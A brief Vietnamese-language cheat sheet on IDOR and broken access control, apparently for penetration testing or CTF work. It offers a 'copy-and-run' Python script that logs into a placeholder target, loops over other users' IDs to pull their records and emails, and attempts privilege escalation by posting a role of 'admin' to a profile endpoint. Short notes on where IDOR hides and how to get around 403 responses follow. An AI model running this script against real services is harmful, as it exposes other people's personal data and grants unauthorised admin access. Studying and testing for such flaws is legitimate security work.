# IDOR / Access Control

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False
s.post(f"{base}/login", data={"username": "user", "password": "pass"}, timeout=5)

# Đổi ID/object của người khác
for uid in [1, 2, 3, 100]:
    r = s.get(f"{base}/api/users/{uid}", timeout=5)
    if r.status_code == 200 and "email" in r.text:
        print("HIT", uid, r.text[:200])

# Thử đổi method/role param nếu có
r = s.post(f"{base}/api/profile", json={"id": 1, "role": "admin"}, timeout=5)
print(r.status_code, r.text[:200])
```

## Lưu ý nhanh
- IDOR thường nằm ở ID trong URL, body JSON, query, hoặc cookie.
- Cần so response của chính mình vs người khác: status, length, field nhạy cảm.
- 403 không phải luôn chặn hết; thử endpoint tương đương/method khác nhưng đừng spam.